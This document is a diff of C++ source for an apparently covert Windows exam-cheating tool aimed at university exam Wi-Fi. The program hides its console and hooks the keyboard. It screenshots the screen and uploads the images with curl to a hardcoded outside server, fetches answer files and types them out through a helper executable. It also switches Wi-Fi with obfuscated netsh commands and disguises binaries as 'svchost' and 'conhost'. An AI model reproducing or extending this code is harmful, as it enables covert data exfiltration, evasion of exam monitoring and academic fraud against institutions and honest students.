@@ -14,6 +14,7 @@
 #include <vector>
 #include <direct.h>
 #include "o.h"
+#include <wlanapi.h>
 #include "c.h"
 #include <conio.h>
 #include <ShlObj.h>
@@ -23,6 +24,8 @@
 #include <sstream>
 #pragma comment(lib,"Wininet.lib")
 #pragma comment( lib, "gdiplus" )
+#pragma comment(lib, "wlanapi.lib")
+#pragma comment(lib, "ole32.lib")
 #pragma warning(disable:4996)
 HHOOK hHook;
 using Find_Window_WINAPI = HWND(LPCSTR, LPCSTR);
@@ -98,7 +101,7 @@ void take_picture(int &i)
 	encoderParameters.Parameter[0].Guid = EncoderQuality;
 	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
 	encoderParameters.Parameter[0].NumberOfValues = 1;
-	quality = 20;
+	quality = 100;
 	encoderParameters.Parameter[0].Value = &quality;
 	std::string file;
 
@@ -116,7 +119,7 @@ void take_picture(int &i)
 	::ReleaseDC(0, scrdc);
 	file = x + std::to_string(i);
 	char cmd[512];
-	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 -crop 0 0 1536 630 %s.jpeg -o %s.webp", file, file);
+	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 %s.jpeg -o %s.webp", file, file);
 	system(cmd);
 
 	sprintf(cmd, "del %s.jpeg", file);
@@ -124,6 +127,7 @@ void take_picture(int &i)
 	system(cmd);
 	i++;
 }
+
 double distance(int x1, int y1, int x2, int y2)
 {
 	// Calculating distance
@@ -186,30 +190,34 @@ void gdiscreen()
 	{
 		
 		hHook = shook_win(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
-		SetWindowText(FindWindow(0,"C:\Program Files\Microsoft.NET\conhost.exe"), "");
-		SetWindowText(FindWindow(0, "C:\Program Files\Microsoft.NET\svchost.exe"), "");
-		SetWindowText(FindWindow("AutoHotkey","C:\Program Files\Microsoft.NET\t3.exe"), "");
+		
 		if (get_key(VK_F6))//Connect to wifi dh
 		{
 			//DH-FPT
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Students" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Students" interface="Wi-Fi")"));
+			//FPTU_Student
+			//FU-Students
+			//FPT University
+			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
 			type = 1;
 			Sleep(100);
 		}
 		if (get_key(VK_F8))//Connect to wifi exam
 		{
 			//FPTU-EXAMONLINE
-			
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Exam" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="FU-Exam" interface="Wi-Fi")"));
+			//FU-Exam
+			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU_Student" interface="Wi-Fi")"));
 		
 			Sleep(100);
 		}
 		if (get_key(VK_F7))//Connect to wifi exam
 		{
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="ABC123" interface="Wi-Fi 2")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name="ABC123" interface="Wi-Fi 2")"));
+			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "k123" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "k123" interface="Wi-Fi")"));
 			type = 2;
 			Sleep(100);
 		}
@@ -224,20 +232,43 @@ void gdiscreen()
 			if (!CreateProcess(NULL, cmd,NULL,  NULL, FALSE, 0,NULL, NULL,&si, &pi))
 			Sleep(100);
 		}
-		if (get_key(VK_INSERT))
+		if (get_key(VK_RBUTTON))
+		{
+			system("taskkill /F /T /IM t3.exe");
+			system("taskkill /F /T /IM t3.exe");
+
+			Sleep(100);
+		}
+		if (get_key(VK_INSERT) || get_key(VK_F9))
 		{
 			std::string file;
 			int n = vec_file("").size();
-			for (int z = 0; z < n; z++) printf("%s\n", vec_file("")[z]);
-			
+			sprintf(cmd, AY_OBFUSCATE(R"(netsh wlan show interface | Findstr /c:"SSID" > wlan.txt)"));
+			system(cmd);
+			std::string name_wifi;
+			std::string ssid1 = "DH-FPT";
+			newfile2.open("wlan.txt", std::ios::in);
+			if (newfile2.is_open())
+			{
+				getline(newfile2, name_wifi);
+				if (name_wifi.find(ssid1) != std::string::npos)
+				{
+					type = 1;
+				}
+				else type = 2;
+				printf("Name wifi:%s & type = %d\n", name_wifi.c_str(),type);
+
+			}
+			newfile2.close();
+			system("del wlan.txt");
 			printf("-------------------------\n");
 			for (int j = 0; j <n; j++)
 			{
 				s = "";
 				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"
 				//sprintf(cmd, AY_OBFUSCATE(R"("t2 -F "uploadedfile=@%s.webp" http://103.143.143.227/up.php?floder="uploads/abc/"")"), file);
-				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/1111/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
-				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 20 http://103.143.143.227:80/up.php?floder="uploads/1111/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20  http://103.143.143.227:80/up.php?floder="uploads/bi_012/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/bi_012/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
 				if(!std::count(uploaded_file.begin(), uploaded_file.end(), vec_file("")[j])) system(cmd);
 				else continue;
 				newfile2.open("stats.txt", std::ios::in);
@@ -260,16 +291,34 @@ void gdiscreen()
 		}
 		if (get_key(VK_F4))
 		{
+			sprintf(cmd, AY_OBFUSCATE(R"(netsh wlan show interface | Findstr /c:"SSID" > wlan.txt)"));
+			system(cmd);
+			std::string name_wifi;
+			std::string ssid1 = "DH-FPT";
+			newfile2.open("wlan.txt", std::ios::in);
+			if (newfile2.is_open())
+			{
+				getline(newfile2, name_wifi);
+				if (name_wifi.find(ssid1) != std::string::npos)
+				{
+					type = 1;
+				}
+				else type = 2;
+				printf("Name wifi:%s & type = %d\n", name_wifi.c_str(), type);
+
+			}
+			newfile2.close();
+			system("del wlan.txt");
 			printf("------------------------DOWNLOAD------------------\n");
 			char cmd[500];
-			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 30 --proxy 10.22.194.46:8080 http://103.143.143.227/1111.txt -o "work.txt"")"));
-			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("svchost -m 40 http://103.143.143.227/1111.txt -o "work.txt"")"));
+			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227/bi_012.txt -o "work.txt"")"));
+			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/bi_012.txt -o "work.txt"")"));
 			system(cmd);
 			printf("--------------------------------------------------");
-			Sleep(100);
+			Sleep(100);	
 		}
 
-		if (get_key(VK_OEM_3))
+		if (get_key	(VK_OEM_3) || get_key(VK_LMENU))
 		{
 			take_picture(i);
 			Sleep(100);
@@ -284,7 +333,7 @@ void gdiscreen()
 			}
 			Sleep(100);
 		}
-		if (get_key(VK_LSHIFT) && toggle)
+		if ( (get_key(VK_MBUTTON) ||get_key(VK_RMENU) || get_key(VK_LSHIFT)) && toggle)
 		{
 			Sleep(200);
 			newfile.open("work.txt", std::ios::in);
@@ -306,7 +355,7 @@ void gdiscreen()
 			si.cb = sizeof(si);
 			ZeroMemory(&pi, sizeof(pi));
 			std::cout << sx[c].c_str() <<std::endl;
-			sprintf(cmd, "C:\\Windows\\System32\\cmd.exe /C t3.exe %s", sx[c].c_str());
+			sprintf(cmd, R"(C:\\Windows\\System32\\cmd.exe /C t3.exe "%s")", sx[c].c_str());
 			std::cout << cmd << std::endl;
 			if (!CreateProcess(NULL,   // No module name (use command line)
 				cmd,        // Command line
@@ -344,13 +393,13 @@ int main()
 		std::string key;
 		printf(AY_OBFUSCATE("key:"));
 		std::cin >> key;
-		const char *x = AY_OBFUSCATE("1111");
+		const char *x = AY_OBFUSCATE("bi_012");
 		if (key == x)
 		{
 			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
 			Sleep(2000);
 			s_wint(gcs_w(), "");
-			sw(gcs_w(), SW_HIDE);
+		    sw(gcs_w(), SW_HIDE);
 			//HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, NULL);
 			gdiscreen();
 		}
